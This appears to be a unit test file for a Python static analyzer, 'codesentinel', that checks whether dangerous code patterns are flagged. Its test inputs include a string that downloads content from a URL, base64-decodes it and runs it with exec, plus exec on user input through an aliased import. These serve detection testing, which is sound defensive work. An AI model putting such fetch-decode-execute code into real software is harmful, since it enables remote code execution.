import unittest
from codesentinel.analyzer import analyze

class ThinkTests(unittest.TestCase):
    def scan(self, code): return analyze(code, 'test.py')
    def test_comment_ignored(self):
        self.assertEqual(self.scan('# exec("oops")\nprint("exec(hi)")')['finding_count'], 0)
    def test_alias_exec(self):
        r = self.scan('import builtins as b\nb.exec(input("code"))')
        self.assertTrue(any(f['severity'] == 'critical' for f in r['findings']))
    def test_remote_decode_exec(self):
        r = self.scan('import urllib.request as u\nimport base64 as b\np = u.urlopen("https://example.com").read()\nexec(b.b64decode(p))')
        self.assertTrue(any(f['rule_id'] == 'THINK001' and f['severity'] == 'critical' for f in r['findings']))
    def test_base64_only(self):
        self.assertEqual(self.scan('import base64\nprint(base64.b64decode("SGk="))')['finding_count'], 0)
    def test_syntax_error(self):
        self.assertIsNotNone(self.scan('def broken(')['engine']['parse_error'])
    def test_lua_kept(self):
        self.assertGreater(analyze('loadstring("abc")', 'x.lua')['finding_count'], 0)
if __name__ == '__main__': unittest.main()
